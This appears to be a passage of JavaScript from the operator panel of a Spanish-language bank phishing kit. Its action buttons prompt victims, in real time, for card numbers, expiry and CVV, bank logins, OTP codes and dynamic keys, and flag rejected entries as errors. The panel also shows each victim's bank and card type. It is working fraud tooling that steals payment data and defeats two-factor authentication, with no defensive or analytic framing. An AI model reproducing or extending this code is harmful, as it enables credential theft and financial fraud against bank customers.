                pagesHtml += `<span class="pagination-ellipsis">...</span>`;
            }
        }

        pagesEl.innerHTML = pagesHtml;
    }
}

// =========================
// Pagination event handlers
// =========================
function initPaginationEvents() {
    const prevBtn = document.getElementById("prevPage");
    const nextBtn = document.getElementById("nextPage");
    const firstBtn = document.getElementById("firstPage");
    const lastBtn = document.getElementById("lastPage");
    const pagesEl = document.getElementById("paginationPages");
    const perPageSelect = document.getElementById("sessionsPerPage");

    if (firstBtn) {
        firstBtn.addEventListener("click", () => {
            if (currentPage > 1) {
                currentPage = 1;
                renderList();
            }
        });
    }

    if (prevBtn) {
        prevBtn.addEventListener("click", () => {
            if (currentPage > 1) {
                currentPage--;
                renderList();
            }
        });
    }

    if (nextBtn) {
        nextBtn.addEventListener("click", () => {
            if (currentPage < totalPages) {
                currentPage++;
                renderList();
            }
        });
    }

    if (lastBtn) {
        lastBtn.addEventListener("click", () => {
            if (currentPage < totalPages) {
                currentPage = totalPages;
                renderList();
            }
        });
    }

    if (pagesEl) {
        pagesEl.addEventListener("click", (e) => {
            const pageLink = e.target.closest("[data-page]");
            if (pageLink) {
                e.preventDefault();
                const page = parseInt(pageLink.dataset.page);
                if (page !== currentPage) {
                    currentPage = page;
                    renderList();
                }
            }
        });
    }

    if (perPageSelect) {
        perPageSelect.addEventListener("change", (e) => {
            sessionsPerPage = parseInt(e.target.value);
            localStorage.setItem("sessionsPerPage", sessionsPerPage);
            currentPage = 1; // Reset to first page
            renderList();
        });
    }
}

// Initialize pagination events when DOM is ready
document.addEventListener("DOMContentLoaded", initPaginationEvents);

// =========================
// Actions render
// =========================
function renderActionsHTML(s, targetElId) {
    const actions = document.getElementById(targetElId);
    if (!actions) return;

    actions.innerHTML = "";
    if (!s) return;

    switch (s.action) {
        case "CC_WAIT_ACTION":
            actions.innerHTML = `
                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_cc')">Error CC</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_auth')">Pedir LOGO</button>
            `;
            break;

        case "CC_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos ⌛</span>`;
            break;
        case "DATA_WAIT_ACTION":
            actions.innerHTML = `
                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_data')">Error DATA</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_cc')">Pedir CC</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_auth')">Pedir LOGO</button>
            `;
            break;

        case "DATA_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos ⌛</span>`;
            break;
        case "AUTH_WAIT_ACTION":
            actions.innerHTML = `
                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_auth')">Error Login</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
            `;
            break;

        case "AUTH_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevos datos ⌛</span>`;
            break;

        case "DINAMIC_WAIT_ACTION":
            actions.innerHTML = `
                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_dinamic')">Error DINA</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
                <button onclick="act('${escapeHtml(s.id)}','request_finish')">Terminar</button>
            `;
            break;

        case "DINAMIC_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nueva dinámica ⌛</span>`;
            break;

        case "OTP_WAIT_ACTION":
            actions.innerHTML = `
                <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_otp')">Error OTP</button>
                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
                <button onclick="act('${escapeHtml(s.id)}','request_finish')">Terminar</button>
            `;
            break;

        case "OTP_ERROR":
            actions.innerHTML = `<span style="color:var(--muted)">Esperando nuevo OTP ⌛</span>`;
            break;

        default:
            actions.innerHTML = `<span style="color:var(--muted)">Sin acciones disponibles en este estado.</span>`;
    }
}

// =========================
// Detail render (desktop + mobile modal)
// =========================
function renderDetail(s) {
    // Desktop detail top
    const selectedIdEl = document.getElementById("selectedId");
    if (selectedIdEl) selectedIdEl.textContent = s?.id ?? "—";

    const dt = document.getElementById("detailTop");
    if (dt) {
        if (s) {
            console.log(s);
        }
    }

    renderActionsHTML(s, "actions");

    // ✅ Focus section logic (ONE TYPE per session)

    // Mobile modal detail
    if (isSmallScreen() && s) {
        const idEl = document.getElementById("modalSessionId");
        const stEl = document.getElementById("modalState");
        const pillBank = document.getElementById("modalBankPill");
        const pillCc = document.getElementById("modalCcPill");
        const pillAction = document.getElementById("modalActionPill");

        if (idEl) idEl.textContent = s.id ?? "—";
        if (stEl)
            stEl.className =
                `dot ${stateDotClass(s.state || "")}`.trim() || "dot";
        if (pillBank) {
            pillBank.textContent = !s.bank ? "⌛..." : `🏦${s.bank}`;
        }
        if (pillCc) {
            const flowCc = s.cc && s.exp && s.cvv;
            const flowAuth = s.user && s.pass;
            const ccText = `${s.type} - ${s.level}`;
            const AuthText = "LOGO";
            pillCc.textContent =
                flowCc ? ccText : flowAuth ? AuthText : "⌛...";
        }
        if (pillAction) {
            const action = String(s.action || "").toUpperCase();

            // Extraer nombre base del action
            const getBaseName = (act) => {
                if (act === "FINISH") return "FINISH";
                if (act.startsWith("DINAMIC")) return "DINA";
                if (act.startsWith("AUTH")) return "LOGO";
                return act.replace("_WAIT_ACTION", "").replace("_ERROR", "");
            };

            const baseName = getBaseName(action);

            if (action === "FINISH") {
                pillAction.className = "pill success";
                pillAction.innerHTML = `<span class="pill-icon">✓</span> ${baseName}`;
            } else if (action.endsWith("_ERROR")) {
                pillAction.className = "pill error";
                pillAction.innerHTML = `<span class="pill-icon">✕</span> ${baseName}`;
            } else if (action.endsWith("_WAIT_ACTION")) {
                pillAction.className = "pill warning";
                pillAction.innerHTML = `<span class="pill-icon">⚠</span> ${baseName}`;
            } else {
                pillAction.className = "pill loading";
                pillAction.innerHTML = `<span class="pill-icon spinner">⏳</span> ${baseName}`;
            }
        }

        renderActionsHTML(s, "modalActions");
    }
}

// =========================
// Global actions
// =========================
window.openSession = function (id) {
    selectedId = id;
    renderList();

    const s = sessionsById[id];
    renderDetail(s);

    if (isSmallScreen() && s) {
        openModal();

        // actualiza timeline con el estado actual y renderiza
        renderModalSectionsForSession(s); //✅ pinta todas las secciones existentes
        renderActionsHTML(s, "modalActions");
    }
};

window.act = function (sessionId, action) {
    // 🔊 sonido cuando admin elige una acción
    if (String(action).startsWith("reject_")) {
        // Error: solo cuando el admin pulsa botón de error
        playSound("error");
    } else if (String(action).startsWith("request_")) {
        // Next: cuando el admin elige cualquier acción que no sea error (avanza)
        playSound("next");
    }

    let message = null;
    if (action === "custom_alert") {
        message = prompt("Mensaje personalizado para el usuario:");
        if (message === null) return;
    }

    const eventName = `admin:${action}`;
    socket?.emit(eventName, message ? { sessionId, message } : { sessionId });
};
// =========================
// Boot
// =========================
renderList();
connectAdmin();
